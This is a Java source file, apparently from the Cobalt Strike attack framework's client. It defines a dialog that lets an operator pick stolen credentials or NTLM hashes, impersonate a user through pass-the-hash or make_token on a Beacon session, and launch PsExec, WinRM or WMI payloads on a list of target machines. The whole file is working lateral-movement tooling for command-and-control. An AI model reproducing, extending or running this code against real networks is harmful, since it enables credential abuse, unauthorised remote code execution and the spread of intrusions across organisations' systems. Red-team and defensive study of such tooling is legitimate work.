package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import aggressor.browsers.Credentials;
import beacon.TaskBeacon;
import common.BeaconEntry;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import ui.ATextField;

import javax.swing.*;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import java.awt.event.ActionEvent;
import java.util.HashMap;

public class JumpDialogAlt implements DialogListener,
        ListSelectionListener,
        ChangeListener {
    protected JFrame dialog = null;
    protected AggressorClient client;
    protected ATextField user;
    protected ATextField pass;
    protected ATextField domain;
    protected Credentials browser;
    protected String title;
    protected String[] targets;
    protected JCheckBox b;

    public static JumpDialogAlt PsExec(AggressorClient client, String[] targets) {
        return new JumpDialogAlt(client, targets, "PsExec");
    }

    public static JumpDialogAlt PsExecPSH(AggressorClient client, String[] targets) {
        return new JumpDialogAlt(client, targets, "PsExec (PowerShell)");
    }

    public static JumpDialogAlt WinRM(AggressorClient client, String[] targets) {
        return new JumpDialogAlt(client, targets, "WinRM (PowerShell)");
    }

    public static JumpDialogAlt WMI(AggressorClient client, String[] targets) {
        return new JumpDialogAlt(client, targets, "WMI (PowerShell)");
    }

    public JumpDialogAlt(AggressorClient client, String[] targets, String title) {
        this.client = client;
        this.browser = new Credentials(client);
        this.title = title;
        this.targets = targets;
        this.browser.setColumns("user, password, realm, note");
    }

    @Override
    public void dialogAction(ActionEvent event, HashMap<String, Object> options) {
        String bid = DialogUtils.string(options, "bid");
        BeaconEntry entry = DataUtils.getBeacon(this.client.getData(), bid);
        String listener = DialogUtils.string(options, "listener");
        TaskBeacon session = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{bid});
        if (entry == null) {
            DialogUtils.showError("You must select a Beacon session!");
            return;
        }
        if (!this.b.isSelected() && !entry.isAdmin()) {
            DialogUtils.showError("Your Beacon must be admin to generate\nand use a token from creds or hashes");
            return;
        }
        DialogUtils.openOrActivate(this.client, bid);
        if (!this.b.isSelected()) {
            session.input("rev2self");
            session.Rev2Self();
            String domainz = this.domain.getText();
            if ("".equals(domainz)) {
                domainz = ".";
            }
            if (this.pass.getText().length() == 32) {
                session.input("pth " + domainz + "\\" + this.user.getText() + " " + this.pass.getText());
                session.PassTheHash(domainz, this.user.getText(), this.pass.getText());
            } else {
                session.input("make_token " + domainz + "\\" + this.user.getText() + " " + this.pass.getText());
                session.LoginUser(domainz, this.user.getText(), this.pass.getText());
            }
        }
        for (String target : this.targets) {
            String tname = DataUtils.getAddressFor(this.client.getData(), target);
            if (this.title.equals("PsExec")) {
                session.input("psexec " + tname + " ADMIN$ " + listener);
                session.PsExec(tname, listener, "ADMIN$");
                continue;
            }
            if (this.title.equals("PsExec (PowerShell)")) {
                session.input("psexec_psh " + tname + " " + listener);
                session.PsExecPSH(tname, listener);
                continue;
            }
            if (this.title.equals("WinRM (PowerShell)")) {
                session.input("winrm " + tname + " " + listener);
                session.WinRM(tname, listener);
                continue;
            }
            if (!this.title.equals("WMI (PowerShell)")) continue;
            session.input("wmi " + tname + " " + listener);
            session.WMI(tname, listener);
        }
    }

    @Override
    public void valueChanged(ListSelectionEvent e) {
        if (e.getValueIsAdjusting()) {
            return;
        }
        this.user.setText((String) this.browser.getSelectedValueFromColumn("user"));
        this.pass.setText((String) this.browser.getSelectedValueFromColumn("password"));
        this.domain.setText((String) this.browser.getSelectedValueFromColumn("realm"));
    }

    @Override
    public void stateChanged(ChangeEvent ev) {
        if (this.b.isSelected()) {
            this.user.setEnabled(false);
            this.pass.setEnabled(false);
            this.domain.setEnabled(false);
        } else {
            this.user.setEnabled(true);
            this.pass.setEnabled(true);
            this.domain.setEnabled(true);
        }
    }

    public void show() {
        this.dialog = DialogUtils.dialog(this.title, 580, 400);
        this.dialog.addWindowListener(this.browser.onclose());
        DialogManager controller = new DialogManager(this.dialog);
        controller.addDialogListener(this);
        JComponent credbrowser = this.browser.getContent();
        this.browser.getTable().getSelectionModel().addListSelectionListener(this);
        this.user = (ATextField) controller.text("user", "User:", 36).get(1);
        this.pass = (ATextField) controller.text("pass", "Password:", 36).get(1);
        this.domain = (ATextField) controller.text("domain", "Domain:", 36).get(1);
        controller.listenerWithSMB("listener", "Listener:", this.client.getConnection(), this.client.getData());
        controller.beacon("bid", "Session:", this.client);
        this.b = controller.checkbox("token", "Use session's current access token");
        this.b.addChangeListener(this);
        JButton ok = controller.action("Launch");
        JButton help = controller.help("https://www.cobaltstrike.com/help-psexec");
        this.dialog.add(credbrowser, "Center");
        this.dialog.add(DialogUtils.stackThree(controller.layout(), this.b, DialogUtils.center(ok, help)), "South");
        this.dialog.setVisible(true);
    }
}

